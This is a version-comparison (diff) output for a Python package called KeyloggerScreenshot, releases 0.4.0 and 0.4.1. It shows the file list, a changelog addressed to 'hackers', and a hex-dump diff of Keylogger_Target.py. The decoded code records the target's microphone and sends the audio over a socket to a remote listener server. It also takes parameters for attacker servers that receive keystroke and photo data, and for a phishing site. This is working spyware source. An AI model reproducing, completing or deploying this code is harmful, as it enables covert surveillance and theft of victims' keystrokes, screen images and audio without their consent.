# Comparing `tmp/KeyloggerScreenshot-0.4.0.tar.gz` & `tmp/KeyloggerScreenshot-0.4.1.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "KeyloggerScreenshot-0.4.0.tar", last modified: Sun Apr 30 16:03:23 2023, max compression
+gzip compressed data, was "KeyloggerScreenshot-0.4.1.tar", last modified: Mon May  8 19:37:08 2023, max compression
```

## Comparing `KeyloggerScreenshot-0.4.0.tar` & `KeyloggerScreenshot-0.4.1.tar`

### file list

```diff
@@ -1,33 +1,33 @@
-drwxrwxrwx   0        0        0        0 2023-04-30 16:03:23.064710 KeyloggerScreenshot-0.4.0/
--rw-rw-rw-   0        0        0     4360 2023-04-30 14:11:18.000000 KeyloggerScreenshot-0.4.0/CHANGELOG.txt
--rw-rw-rw-   0        0        0    12113 2023-04-21 17:24:25.000000 KeyloggerScreenshot-0.4.0/KLS_start.py
-drwxrwxrwx   0        0        0        0 2023-04-30 16:03:23.011628 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/
--rw-rw-rw-   0        0        0    14352 2023-04-30 15:00:49.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Keylogger_Target.py
--rw-rw-rw-   0        0        0     1323 2023-04-30 14:21:53.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Local_Deleter.py
--rw-rw-rw-   0        0        0     1917 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Port_data.py
--rw-rw-rw-   0        0        0     6600 2023-04-30 15:49:34.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_keylogger.py
--rw-rw-rw-   0        0        0     2574 2023-04-30 15:31:41.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_listener.py
--rw-rw-rw-   0        0        0     3903 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_photos.py
--rw-rw-rw-   0        0        0     1742 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Server_timer.py
--rw-rw-rw-   0        0        0     7151 2023-04-30 12:01:41.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Simulation_code.py
--rw-rw-rw-   0        0        0      323 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/__init__.py
-drwxrwxrwx   0        0        0        0 2023-04-30 16:03:23.056629 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/
--rw-rw-rw-   0        0        0    10463 2023-04-30 16:03:22.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      718 2023-04-30 16:03:22.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-04-30 16:03:22.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       47 2023-04-30 16:03:22.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/requires.txt
--rw-rw-rw-   0        0        0       20 2023-04-30 16:03:22.000000 KeyloggerScreenshot-0.4.0/KeyloggerScreenshot.egg-info/top_level.txt
--rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.0/LISCENCE.txt
--rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.0/MANIFEST.in
--rw-rw-rw-   0        0        0    10463 2023-04-30 16:03:23.061700 KeyloggerScreenshot-0.4.0/PKG-INFO
--rw-rw-rw-   0        0        0     5340 2023-04-30 15:00:49.000000 KeyloggerScreenshot-0.4.0/README.md
--rw-rw-rw-   0        0        0     7182 2023-04-30 13:27:18.000000 KeyloggerScreenshot-0.4.0/Simualation_code.py
--rw-rw-rw-   0        0        0      388 2023-04-27 07:59:51.000000 KeyloggerScreenshot-0.4.0/client.py
--rw-rw-rw-   0        0        0      657 2023-04-30 14:26:07.000000 KeyloggerScreenshot-0.4.0/demon_server.py
--rw-rw-rw-   0        0        0      923 2023-04-27 06:42:15.000000 KeyloggerScreenshot-0.4.0/leo_gui.py
--rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.4.0/requirements.py
--rw-rw-rw-   0        0        0       42 2023-04-30 16:03:23.064710 KeyloggerScreenshot-0.4.0/setup.cfg
--rw-rw-rw-   0        0        0     1075 2023-04-30 14:11:18.000000 KeyloggerScreenshot-0.4.0/setup.py
--rw-rw-rw-   0        0        0      293 2023-04-30 14:26:07.000000 KeyloggerScreenshot-0.4.0/target.py
--rw-rw-rw-   0        0        0     1033 2023-04-30 11:23:59.000000 KeyloggerScreenshot-0.4.0/test.py
--rw-rw-rw-   0        0        0       55 2023-04-30 11:29:13.000000 KeyloggerScreenshot-0.4.0/tester.py
+drwxrwxrwx   0        0        0        0 2023-05-08 19:37:08.501894 KeyloggerScreenshot-0.4.1/
+-rw-rw-rw-   0        0        0     4546 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.1/CHANGELOG.txt
+-rw-rw-rw-   0        0        0    12113 2023-04-21 17:24:25.000000 KeyloggerScreenshot-0.4.1/KLS_start.py
+drwxrwxrwx   0        0        0        0 2023-05-08 19:37:08.453704 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/
+-rw-rw-rw-   0        0        0    14618 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Keylogger_Target.py
+-rw-rw-rw-   0        0        0     1294 2023-05-08 18:39:37.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Local_Deleter.py
+-rw-rw-rw-   0        0        0     1917 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Port_data.py
+-rw-rw-rw-   0        0        0     6600 2023-05-08 18:36:28.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_keylogger.py
+-rw-rw-rw-   0        0        0     2574 2023-04-30 15:31:41.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_listener.py
+-rw-rw-rw-   0        0        0     3903 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_photos.py
+-rw-rw-rw-   0        0        0     1742 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Server_timer.py
+-rw-rw-rw-   0        0        0     8495 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Simulation_code.py
+-rw-rw-rw-   0        0        0      323 2023-04-27 08:12:44.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/__init__.py
+drwxrwxrwx   0        0        0        0 2023-05-08 19:37:08.498816 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/
+-rw-rw-rw-   0        0        0    10639 2023-05-08 19:37:07.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      718 2023-05-08 19:37:08.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-05-08 19:37:07.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       47 2023-05-08 19:37:07.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/requires.txt
+-rw-rw-rw-   0        0        0       20 2023-05-08 19:37:07.000000 KeyloggerScreenshot-0.4.1/KeyloggerScreenshot.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0     1058 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.1/LISCENCE.txt
+-rw-rw-rw-   0        0        0       36 2023-02-11 20:44:30.000000 KeyloggerScreenshot-0.4.1/MANIFEST.in
+-rw-rw-rw-   0        0        0    10639 2023-05-08 19:37:08.500903 KeyloggerScreenshot-0.4.1/PKG-INFO
+-rw-rw-rw-   0        0        0     5340 2023-04-30 15:00:49.000000 KeyloggerScreenshot-0.4.1/README.md
+-rw-rw-rw-   0        0        0     8358 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.1/Simualation_code.py
+-rw-rw-rw-   0        0        0      388 2023-04-27 07:59:51.000000 KeyloggerScreenshot-0.4.1/client.py
+-rw-rw-rw-   0        0        0      656 2023-05-08 19:18:30.000000 KeyloggerScreenshot-0.4.1/demon_server.py
+-rw-rw-rw-   0        0        0      923 2023-04-27 06:42:15.000000 KeyloggerScreenshot-0.4.1/leo_gui.py
+-rw-rw-rw-   0        0        0     1207 2023-03-14 06:32:31.000000 KeyloggerScreenshot-0.4.1/requirements.py
+-rw-rw-rw-   0        0        0       42 2023-05-08 19:37:08.502893 KeyloggerScreenshot-0.4.1/setup.cfg
+-rw-rw-rw-   0        0        0     1065 2023-05-08 19:37:04.000000 KeyloggerScreenshot-0.4.1/setup.py
+-rw-rw-rw-   0        0        0      269 2023-05-08 19:18:30.000000 KeyloggerScreenshot-0.4.1/target.py
+-rw-rw-rw-   0        0        0      240 2023-05-08 19:06:24.000000 KeyloggerScreenshot-0.4.1/test.py
+-rw-rw-rw-   0        0        0       55 2023-04-30 11:29:13.000000 KeyloggerScreenshot-0.4.1/tester.py
```

### Comparing `KeyloggerScreenshot-0.4.0/CHANGELOG.txt` & `KeyloggerScreenshot-0.4.1/CHANGELOG.txt`

 * *Files 2% similar despite different names*

```diff
@@ -161,8 +161,13 @@
 - More intelligent Keylogger (understands when to change the list)
 - Stops the process of images also in linux with PID
 - PID fix on windows
 - duration_in_seconds has been changed to 60 seconds from 200 seconds
 - Mouseclick information will now be sent after Interruption
 - More intelligent Keylogger
 - If backspace is pressed the last pressed character will be deleted from the list
-- Detects if backspace is hold for a long time
+- Detects if backspace is hold for a long time
+
+0.4.1 (08/05/2023)
+-------------------
+- Fixed Interruption Error
+- Every coordinate of the target no mater what Image size it has will now be shown on the hackers Simulation_code
```

### Comparing `KeyloggerScreenshot-0.4.0/KLS_start.py` & `KeyloggerScreenshot-0.4.1/KLS_start.py`

 * *Files identical despite different names*

### Comparing `KeyloggerScreenshot-0.4.0/KeyloggerScreenshot/Keylogger_Target.py` & `KeyloggerScreenshot-0.4.1/KeyloggerScreenshot/Keylogger_Target.py`

 * *Files 3% similar despite different names*

```diff
@@ -37,861 +37,878 @@
 00000240: 302c 2070 6869 7368 696e 675f 7765 623d  0, phishing_web=
 00000250: 4e6f 6e65 293a 0d0a 2020 2020 2020 2020  None):..        
 00000260: 2320 2264 7572 6174 696f 6e5f 696e 5f73  # "duration_in_s
 00000270: 6563 6f6e 6473 2220 7465 6c6c 7320 7468  econds" tells th
 00000280: 6520 7072 6f67 7261 6d6d 2068 6f77 206c  e programm how l
 00000290: 6f6e 6720 6974 2073 686f 756c 6420 6c61  ong it should la
 000002a0: 7374 2074 6865 2064 6566 6175 6c74 2074  st the default t
-000002b0: 696d 6520 6973 2032 3030 2073 6563 6f6e  ime is 200 secon
-000002c0: 6473 2074 6861 7427 7320 3320 4d69 6e75  ds that's 3 Minu
-000002d0: 7465 7320 616e 6420 3230 2053 6563 6f6e  tes and 20 Secon
-000002e0: 6473 0d0a 2020 2020 2020 2020 6173 7365  ds..        asse
-000002f0: 7274 2064 7572 6174 696f 6e5f 696e 5f73  rt duration_in_s
-00000300: 6563 6f6e 6473 203e 3d20 3630 2c20 6622  econds >= 60, f"
-00000310: 7b64 7572 6174 696f 6e5f 696e 5f73 6563  {duration_in_sec
-00000320: 6f6e 6473 7d20 6973 206e 6f74 2067 7265  onds} is not gre
-00000330: 6174 6572 2061 6e64 206e 6f74 2065 7175  ater and not equ
-00000340: 616c 2074 6f20 3630 220d 0a20 2020 2020  al to 60"..     
-00000350: 2020 2023 2022 6475 7261 7469 6f6e 5f69     # "duration_i
-00000360: 6e5f 7365 636f 6e64 7322 2073 686f 756c  n_seconds" shoul
-00000370: 6420 616c 7761 7973 2062 6520 6269 6767  d always be bigg
-00000380: 6572 2074 6861 6e20 3630 2073 6563 6f6e  er than 60 secon
-00000390: 6473 0d0a 0d0a 2020 2020 2020 2020 7365  ds....        se
-000003a0: 6c66 2e69 705f 7068 6f74 6f73 203d 2069  lf.ip_photos = i
-000003b0: 705f 6f66 5f73 6572 7665 725f 7068 6f74  p_of_server_phot
-000003c0: 6f73 0d0a 2020 2020 2020 2020 7365 6c66  os..        self
-000003d0: 2e70 6f72 745f 7068 6f74 6f73 203d 2070  .port_photos = p
-000003e0: 6f72 745f 6f66 5f73 6572 7665 725f 7068  ort_of_server_ph
-000003f0: 6f74 6f73 0d0a 2020 2020 2020 2020 7365  otos..        se
-00000400: 6c66 2e69 705f 6b65 796c 6f67 6765 7220  lf.ip_keylogger 
-00000410: 3d20 6970 5f6f 665f 7365 7276 6572 5f6b  = ip_of_server_k
-00000420: 6579 6c6f 6767 6572 5f64 6174 610d 0a20  eylogger_data.. 
-00000430: 2020 2020 2020 2073 656c 662e 706f 7274         self.port
-00000440: 5f6b 6579 6c6f 6767 6572 203d 2070 6f72  _keylogger = por
-00000450: 745f 6f66 5f73 6572 7665 725f 6b65 796c  t_of_server_keyl
-00000460: 6f67 6765 725f 6461 7461 0d0a 2020 2020  ogger_data..    
-00000470: 2020 2020 7365 6c66 2e69 705f 6c69 7374      self.ip_list
-00000480: 656e 6572 203d 2069 705f 6f66 5f73 6572  ener = ip_of_ser
-00000490: 7665 725f 6c69 7374 656e 6572 0d0a 2020  ver_listener..  
-000004a0: 2020 2020 2020 7365 6c66 2e70 6f72 745f        self.port_
-000004b0: 6c69 7374 656e 6572 203d 2070 6f72 745f  listener = port_
-000004c0: 6f66 5f73 6572 7665 725f 6c69 7374 656e  of_server_listen
-000004d0: 6572 0d0a 2020 2020 2020 2020 7365 6c66  er..        self
-000004e0: 2e64 7572 6174 696f 6e20 3d20 6475 7261  .duration = dura
-000004f0: 7469 6f6e 5f69 6e5f 7365 636f 6e64 730d  tion_in_seconds.
-00000500: 0a20 2020 2020 2020 2073 656c 662e 6970  .        self.ip
-00000510: 5f74 696d 6572 203d 2069 705f 6f66 5f74  _timer = ip_of_t
-00000520: 696d 6572 0d0a 2020 2020 2020 2020 7365  imer..        se
-00000530: 6c66 2e70 6f72 745f 7469 6d65 7220 3d20  lf.port_timer = 
-00000540: 706f 7274 5f6f 665f 7469 6d65 720d 0a20  port_of_timer.. 
-00000550: 2020 2020 2020 2073 656c 662e 7068 6973         self.phis
-00000560: 6869 6e67 203d 2070 6869 7368 696e 675f  hing = phishing_
-00000570: 7765 620d 0a0d 0a20 2020 2020 2020 2073  web....        s
-00000580: 656c 662e 6368 6563 6b20 3d20 5b5d 0d0a  elf.check = []..
-00000590: 2020 2020 2020 2020 7365 6c66 2e63 6170          self.cap
-000005a0: 7320 3d20 4661 6c73 650d 0a20 2020 2020  s = False..     
-000005b0: 2020 2073 656c 662e 7269 6368 7469 6765     self.richtige
-000005c0: 5f6c 6973 7465 203d 205b 5d0d 0a20 2020  _liste = []..   
-000005d0: 2020 2020 2073 656c 662e 636f 6f72 6469       self.coordi
-000005e0: 6e61 7465 7320 3d20 5b5d 0d0a 2020 2020  nates = []..    
-000005f0: 2020 2020 7365 6c66 2e77 6f72 6420 3d20      self.word = 
-00000600: 4e6f 6e65 0d0a 2020 2020 2020 2020 7365  None..        se
-00000610: 6c66 2e73 6563 6f6e 6473 203d 205b 5d0d  lf.seconds = [].
-00000620: 0a0d 0a20 2020 2064 6566 2064 6174 656e  ...    def daten
-00000630: 5f61 7566 6e65 6865 6d65 6e28 7365 6c66  _aufnehemen(self
-00000640: 293a 0d0a 2020 2020 2020 2020 6c69 7374  ):..        list
-00000650: 656e 696e 675f 6461 7461 203d 2073 6f63  ening_data = soc
-00000660: 6b65 742e 736f 636b 6574 2873 6f63 6b65  ket.socket(socke
-00000670: 742e 4146 5f49 4e45 542c 2073 6f63 6b65  t.AF_INET, socke
-00000680: 742e 534f 434b 5f53 5452 4541 4d29 0d0a  t.SOCK_STREAM)..
-00000690: 2020 2020 2020 2020 6c69 7374 656e 696e          listenin
-000006a0: 675f 6461 7461 2e63 6f6e 6e65 6374 2828  g_data.connect((
-000006b0: 7365 6c66 2e69 705f 6c69 7374 656e 6572  self.ip_listener
-000006c0: 2c20 7365 6c66 2e70 6f72 745f 6c69 7374  , self.port_list
-000006d0: 656e 6572 2929 0d0a 2020 2020 2020 2020  ener))..        
-000006e0: 7472 793a 0d0a 2020 2020 2020 2020 2020  try:..          
-000006f0: 2020 666f 726d 6174 203d 2070 7961 7564    format = pyaud
-00000700: 696f 2e70 6149 6e74 3136 0d0a 2020 2020  io.paInt16..    
-00000710: 2020 2020 2020 2020 6368 616e 6e65 6c73          channels
-00000720: 203d 2032 0d0a 2020 2020 2020 2020 2020   = 2..          
-00000730: 2020 7261 7465 203d 2034 3431 3030 0d0a    rate = 44100..
-00000740: 2020 2020 2020 2020 2020 2020 6368 756e              chun
-00000750: 6b20 3d20 3130 3234 0d0a 2020 2020 2020  k = 1024..      
-00000760: 2020 2020 2020 7365 636f 6e64 7320 3d20        seconds = 
-00000770: 7365 6c66 2e64 7572 6174 696f 6e20 2b20  self.duration + 
-00000780: 310d 0a0d 0a20 2020 2020 2020 2020 2020  1....           
-00000790: 2061 7564 696f 203d 2070 7961 7564 696f   audio = pyaudio
-000007a0: 2e50 7941 7564 696f 2829 0d0a 0d0a 2020  .PyAudio()....  
-000007b0: 2020 2020 2020 2020 2020 2320 7374 6172            # star
-000007c0: 7420 5265 636f 7264 696e 670d 0a20 2020  t Recording..   
-000007d0: 2020 2020 2020 2020 2073 7472 6561 6d20           stream 
-000007e0: 3d20 6175 6469 6f2e 6f70 656e 2866 6f72  = audio.open(for
-000007f0: 6d61 743d 666f 726d 6174 2c20 6368 616e  mat=format, chan
-00000800: 6e65 6c73 3d63 6861 6e6e 656c 732c 0d0a  nels=channels,..
-00000810: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000002b0: 696d 6520 6973 2036 3020 7365 636f 6e64  ime is 60 second
+000002c0: 7320 7468 6174 2773 2031 204d 696e 7574  s that's 1 Minut
+000002d0: 650d 0a20 2020 2020 2020 2061 7373 6572  e..        asser
+000002e0: 7420 6475 7261 7469 6f6e 5f69 6e5f 7365  t duration_in_se
+000002f0: 636f 6e64 7320 3e3d 2036 302c 2066 227b  conds >= 60, f"{
+00000300: 6475 7261 7469 6f6e 5f69 6e5f 7365 636f  duration_in_seco
+00000310: 6e64 737d 2069 7320 6e6f 7420 6772 6561  nds} is not grea
+00000320: 7465 7220 616e 6420 6e6f 7420 6571 7561  ter and not equa
+00000330: 6c20 746f 2036 3022 0d0a 2020 2020 2020  l to 60"..      
+00000340: 2020 2320 2264 7572 6174 696f 6e5f 696e    # "duration_in
+00000350: 5f73 6563 6f6e 6473 2220 7368 6f75 6c64  _seconds" should
+00000360: 2061 6c77 6179 7320 6265 2062 6967 6765   always be bigge
+00000370: 7220 7468 616e 2036 3020 7365 636f 6e64  r than 60 second
+00000380: 730d 0a0d 0a20 2020 2020 2020 2073 656c  s....        sel
+00000390: 662e 6970 5f70 686f 746f 7320 3d20 6970  f.ip_photos = ip
+000003a0: 5f6f 665f 7365 7276 6572 5f70 686f 746f  _of_server_photo
+000003b0: 730d 0a20 2020 2020 2020 2073 656c 662e  s..        self.
+000003c0: 706f 7274 5f70 686f 746f 7320 3d20 706f  port_photos = po
+000003d0: 7274 5f6f 665f 7365 7276 6572 5f70 686f  rt_of_server_pho
+000003e0: 746f 730d 0a20 2020 2020 2020 2073 656c  tos..        sel
+000003f0: 662e 6970 5f6b 6579 6c6f 6767 6572 203d  f.ip_keylogger =
+00000400: 2069 705f 6f66 5f73 6572 7665 725f 6b65   ip_of_server_ke
+00000410: 796c 6f67 6765 725f 6461 7461 0d0a 2020  ylogger_data..  
+00000420: 2020 2020 2020 7365 6c66 2e70 6f72 745f        self.port_
+00000430: 6b65 796c 6f67 6765 7220 3d20 706f 7274  keylogger = port
+00000440: 5f6f 665f 7365 7276 6572 5f6b 6579 6c6f  _of_server_keylo
+00000450: 6767 6572 5f64 6174 610d 0a20 2020 2020  gger_data..     
+00000460: 2020 2073 656c 662e 6970 5f6c 6973 7465     self.ip_liste
+00000470: 6e65 7220 3d20 6970 5f6f 665f 7365 7276  ner = ip_of_serv
+00000480: 6572 5f6c 6973 7465 6e65 720d 0a20 2020  er_listener..   
+00000490: 2020 2020 2073 656c 662e 706f 7274 5f6c       self.port_l
+000004a0: 6973 7465 6e65 7220 3d20 706f 7274 5f6f  istener = port_o
+000004b0: 665f 7365 7276 6572 5f6c 6973 7465 6e65  f_server_listene
+000004c0: 720d 0a20 2020 2020 2020 2073 656c 662e  r..        self.
+000004d0: 6475 7261 7469 6f6e 203d 2064 7572 6174  duration = durat
+000004e0: 696f 6e5f 696e 5f73 6563 6f6e 6473 0d0a  ion_in_seconds..
+000004f0: 2020 2020 2020 2020 7365 6c66 2e69 705f          self.ip_
+00000500: 7469 6d65 7220 3d20 6970 5f6f 665f 7469  timer = ip_of_ti
+00000510: 6d65 720d 0a20 2020 2020 2020 2073 656c  mer..        sel
+00000520: 662e 706f 7274 5f74 696d 6572 203d 2070  f.port_timer = p
+00000530: 6f72 745f 6f66 5f74 696d 6572 0d0a 2020  ort_of_timer..  
+00000540: 2020 2020 2020 7365 6c66 2e70 6869 7368        self.phish
+00000550: 696e 6720 3d20 7068 6973 6869 6e67 5f77  ing = phishing_w
+00000560: 6562 0d0a 0d0a 2020 2020 2020 2020 7365  eb....        se
+00000570: 6c66 2e63 6865 636b 203d 205b 5d0d 0a20  lf.check = [].. 
+00000580: 2020 2020 2020 2073 656c 662e 6361 7073         self.caps
+00000590: 203d 2046 616c 7365 0d0a 2020 2020 2020   = False..      
+000005a0: 2020 7365 6c66 2e72 6963 6874 6967 655f    self.richtige_
+000005b0: 6c69 7374 6520 3d20 5b5d 0d0a 2020 2020  liste = []..    
+000005c0: 2020 2020 7365 6c66 2e63 6f6f 7264 696e      self.coordin
+000005d0: 6174 6573 203d 205b 5d0d 0a20 2020 2020  ates = []..     
+000005e0: 2020 2073 656c 662e 776f 7264 203d 204e     self.word = N
+000005f0: 6f6e 650d 0a20 2020 2020 2020 2073 656c  one..        sel
+00000600: 662e 7365 636f 6e64 7320 3d20 5b5d 0d0a  f.seconds = []..
+00000610: 2020 2020 2020 2020 7365 6c66 2e66 7261          self.fra
+00000620: 6d65 7320 3d20 4e6f 6e65 0d0a 0d0a 2020  mes = None....  
+00000630: 2020 6465 6620 6461 7465 6e5f 6175 666e    def daten_aufn
+00000640: 6568 656d 656e 2873 656c 6629 3a0d 0a20  ehemen(self):.. 
+00000650: 2020 2020 2020 206c 6973 7465 6e69 6e67         listening
+00000660: 5f64 6174 6120 3d20 736f 636b 6574 2e73  _data = socket.s
+00000670: 6f63 6b65 7428 736f 636b 6574 2e41 465f  ocket(socket.AF_
+00000680: 494e 4554 2c20 736f 636b 6574 2e53 4f43  INET, socket.SOC
+00000690: 4b5f 5354 5245 414d 290d 0a20 2020 2020  K_STREAM)..     
+000006a0: 2020 206c 6973 7465 6e69 6e67 5f64 6174     listening_dat
+000006b0: 612e 636f 6e6e 6563 7428 2873 656c 662e  a.connect((self.
+000006c0: 6970 5f6c 6973 7465 6e65 722c 2073 656c  ip_listener, sel
+000006d0: 662e 706f 7274 5f6c 6973 7465 6e65 7229  f.port_listener)
+000006e0: 290d 0a20 2020 2020 2020 2074 7279 3a0d  )..        try:.
+000006f0: 0a20 2020 2020 2020 2020 2020 2066 6f72  .            for
+00000700: 6d61 7420 3d20 7079 6175 6469 6f2e 7061  mat = pyaudio.pa
+00000710: 496e 7431 360d 0a20 2020 2020 2020 2020  Int16..         
+00000720: 2020 2063 6861 6e6e 656c 7320 3d20 320d     channels = 2.
+00000730: 0a20 2020 2020 2020 2020 2020 2072 6174  .            rat
+00000740: 6520 3d20 3434 3130 300d 0a20 2020 2020  e = 44100..     
+00000750: 2020 2020 2020 2063 6875 6e6b 203d 2031         chunk = 1
+00000760: 3032 340d 0a20 2020 2020 2020 2020 2020  024..           
+00000770: 2073 6563 6f6e 6473 203d 2073 656c 662e   seconds = self.
+00000780: 6475 7261 7469 6f6e 202b 2031 0d0a 0d0a  duration + 1....
+00000790: 2020 2020 2020 2020 2020 2020 6175 6469              audi
+000007a0: 6f20 3d20 7079 6175 6469 6f2e 5079 4175  o = pyaudio.PyAu
+000007b0: 6469 6f28 290d 0a0d 0a20 2020 2020 2020  dio()....       
+000007c0: 2020 2020 2023 2073 7461 7274 2052 6563       # start Rec
+000007d0: 6f72 6469 6e67 0d0a 2020 2020 2020 2020  ording..        
+000007e0: 2020 2020 7374 7265 616d 203d 2061 7564      stream = aud
+000007f0: 696f 2e6f 7065 6e28 666f 726d 6174 3d66  io.open(format=f
+00000800: 6f72 6d61 742c 2063 6861 6e6e 656c 733d  ormat, channels=
+00000810: 6368 616e 6e65 6c73 2c0d 0a20 2020 2020  channels,..     
 00000820: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00000830: 7261 7465 3d72 6174 652c 2069 6e70 7574  rate=rate, input
-00000840: 3d54 7275 652c 0d0a 2020 2020 2020 2020  =True,..        
-00000850: 2020 2020 2020 2020 2020 2020 2020 2020                  
-00000860: 2020 2020 2020 2020 6672 616d 6573 5f70          frames_p
-00000870: 6572 5f62 7566 6665 723d 6368 756e 6b29  er_buffer=chunk)
-00000880: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
-00000890: 7072 696e 7428 2272 6563 6f72 6469 6e67  print("recording
-000008a0: 2e2e 2e22 290d 0a20 2020 2020 2020 2020  ...")..         
-000008b0: 2020 2066 7261 6d65 7320 3d20 5b5d 0d0a     frames = []..
-000008c0: 0d0a 2020 2020 2020 2020 2020 2020 666f  ..            fo
-000008d0: 7220 6920 696e 2072 616e 6765 2830 2c20  r i in range(0, 
-000008e0: 696e 7428 7261 7465 202f 2063 6875 6e6b  int(rate / chunk
-000008f0: 202a 2073 6563 6f6e 6473 2929 3a0d 0a20   * seconds)):.. 
-00000900: 2020 2020 2020 2020 2020 2020 2020 2064                 d
-00000910: 6174 6120 3d20 7374 7265 616d 2e72 6561  ata = stream.rea
-00000920: 6428 6368 756e 6b29 0d0a 2020 2020 2020  d(chunk)..      
-00000930: 2020 2020 2020 2020 2020 6672 616d 6573            frames
-00000940: 2e61 7070 656e 6428 6461 7461 290d 0a0d  .append(data)...
-00000950: 0a20 2020 2020 2020 2020 2020 2023 2070  .            # p
-00000960: 7269 6e74 2822 6669 6e69 7368 6564 2072  rint("finished r
-00000970: 6563 6f72 6469 6e67 2229 0d0a 0d0a 2020  ecording")....  
-00000980: 2020 2020 2020 2020 2020 2320 7374 6f70            # stop
-00000990: 2052 6563 6f72 6469 6e67 0d0a 2020 2020   Recording..    
-000009a0: 2020 2020 2020 2020 7374 7265 616d 2e73          stream.s
-000009b0: 746f 705f 7374 7265 616d 2829 0d0a 2020  top_stream()..  
-000009c0: 2020 2020 2020 2020 2020 7374 7265 616d            stream
-000009d0: 2e63 6c6f 7365 2829 0d0a 2020 2020 2020  .close()..      
-000009e0: 2020 2020 2020 6175 6469 6f2e 7465 726d        audio.term
-000009f0: 696e 6174 6528 290d 0a0d 0a20 2020 2020  inate()....     
-00000a00: 2020 2020 2020 2023 2043 6f6e 6e65 6374         # Connect
-00000a10: 696f 6e20 7769 7468 2053 6572 7665 724c  ion with ServerL
-00000a20: 6973 7465 6e65 720d 0a0d 0a20 2020 2020  istener....     
-00000a30: 2020 2020 2020 2073 7472 5f66 7261 6d65         str_frame
-00000a40: 7320 3d20 7374 7228 6672 616d 6573 290d  s = str(frames).
-00000a50: 0a20 2020 2020 2020 2020 2020 206c 6973  .            lis
-00000a60: 7465 6e69 6e67 5f64 6174 612e 7365 6e64  tening_data.send
-00000a70: 2873 7472 5f66 7261 6d65 732e 656e 636f  (str_frames.enco
-00000a80: 6465 2829 290d 0a0d 0a20 2020 2020 2020  de())....       
-00000a90: 2065 7863 6570 7420 4f53 4572 726f 723a   except OSError:
-00000aa0: 0d0a 2020 2020 2020 2020 2020 2020 7072  ..            pr
-00000ab0: 696e 7428 224e 4f20 4d49 4352 4f50 484f  int("NO MICROPHO
-00000ac0: 4e45 2044 4554 4543 5445 4420 4f52 204d  NE DETECTED OR M
-00000ad0: 4943 524f 5048 4f4e 4520 5345 5454 494e  ICROPHONE SETTIN
-00000ae0: 4720 4449 5341 424c 4544 2229 0d0a 2020  G DISABLED")..  
-00000af0: 2020 2020 2020 2020 2020 6e6f 5f6d 6963            no_mic
-00000b00: 726f 666f 6e20 3d20 2254 4845 2054 4152  rofon = "THE TAR
-00000b10: 4745 5420 4841 5320 4e4f 204d 4943 524f  GET HAS NO MICRO
-00000b20: 5048 4f4e 4520 4f4e 220d 0a20 2020 2020  PHONE ON"..     
-00000b30: 2020 2020 2020 206c 6973 7465 6e69 6e67         listening
-00000b40: 5f64 6174 612e 7365 6e64 286e 6f5f 6d69  _data.send(no_mi
-00000b50: 6372 6f66 6f6e 2e65 6e63 6f64 6528 2929  crofon.encode())
-00000b60: 0d0a 2020 2020 2020 2020 2020 2020 2320  ..            # 
-00000b70: 5365 6e64 7320 6461 7461 2074 6f20 5365  Sends data to Se
-00000b80: 7276 6572 4c69 7374 656e 6572 0d0a 0d0a  rverListener....
-00000b90: 2020 2020 6465 6620 616c 6c5f 6469 7228      def all_dir(
-00000ba0: 7365 6c66 293a 0d0a 2020 2020 2020 2020  self):..        
-00000bb0: 676c 6f62 616c 2072 616e 646f 6d5f 6c73  global random_ls
